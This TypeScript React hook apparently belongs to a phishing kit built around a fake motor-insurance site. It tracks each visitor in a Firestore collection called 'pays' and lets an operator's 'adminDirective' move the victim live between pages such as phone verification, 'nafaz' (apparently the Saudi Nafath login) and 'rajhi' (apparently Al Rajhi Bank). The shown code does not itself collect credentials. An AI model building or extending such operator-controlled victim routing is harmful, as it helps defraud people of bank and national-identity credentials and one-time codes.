import { useEffect, useCallback, useRef } from "react";
import { useLocation } from "wouter";
import { db, addData, generateVisitorId, isFirebaseConfigured } from "@/lib/firebase";
import { doc, onSnapshot } from "firebase/firestore";

export type RoutablePage = "motor-insurance" | "phone-verification" | "nafaz" | "rajhi" | "done";

export interface AdminDirective {
  targetPage?: RoutablePage;
  targetStep?: number;
  issuedAt?: string;
  issuedBy?: string;
}

export interface VisitorData {
  adminDirective?: AdminDirective;
  currentPage?: string;
  currentStep?: number;
}

const PAGE_ROUTES: Record<RoutablePage, string> = {
  "motor-insurance": "/",
  "phone-verification": "/phone",
  "nafaz": "/nafaz",
  "rajhi": "/rajhi",
  "done": "/",
};

interface UseVisitorRoutingOptions {
  currentPage: RoutablePage;
  currentStep?: number;
  onStepChange?: (step: number) => void;
}

export function useVisitorRouting({
  currentPage,
  currentStep,
  onStepChange,
}: UseVisitorRoutingOptions) {
  const [location, setLocation] = useLocation();
  const lastDirectiveRef = useRef<string | null>(null);

  const getVisitorId = useCallback((): string => {
    if (typeof localStorage === "undefined") return "";
    
    let visitorId = localStorage.getItem("visitor");
    if (!visitorId) {
      visitorId = generateVisitorId();
      localStorage.setItem("visitor", visitorId);
    }
    return visitorId;
  }, []);

  const visitorId = getVisitorId();

  const updateVisitorState = useCallback(async (page: RoutablePage, step?: number) => {
    if (!visitorId) return;
    
    await addData({
      id: visitorId,
      currentPage: page,
      currentStep: step,
    });
  }, [visitorId]);

  useEffect(() => {
    if (!visitorId || !db || !isFirebaseConfigured) return;

    const docRef = doc(db, "pays", visitorId);
    
    const unsubscribe = onSnapshot(docRef, (docSnap) => {
      if (!docSnap.exists()) return;
      
      const data = docSnap.data() as VisitorData;
      const directive = data.adminDirective;
      
      if (!directive || !directive.targetPage) return;

      const directiveKey = `${directive.targetPage}-${directive.targetStep}-${directive.issuedAt}`;
      
      if (lastDirectiveRef.current === directiveKey) return;
      lastDirectiveRef.current = directiveKey;

      if (directive.targetPage !== currentPage) {
        const targetRoute = PAGE_ROUTES[directive.targetPage];
        if (targetRoute && location !== targetRoute) {
          setLocation(targetRoute);
        }
      } else if (directive.targetStep !== undefined && directive.targetStep !== currentStep) {
        if (onStepChange) {
          onStepChange(directive.targetStep);
        }
      }
    }, (error) => {
      console.error("Error listening to visitor routing:", error);
    });

    return () => unsubscribe();
  }, [visitorId, currentPage, currentStep, location, setLocation, onStepChange]);

  useEffect(() => {
    if (visitorId && currentPage) {
      updateVisitorState(currentPage, currentStep);
    }
  }, [visitorId, currentPage, currentStep, updateVisitorState]);

  return {
    visitorId,
    updateVisitorState,
  };
}
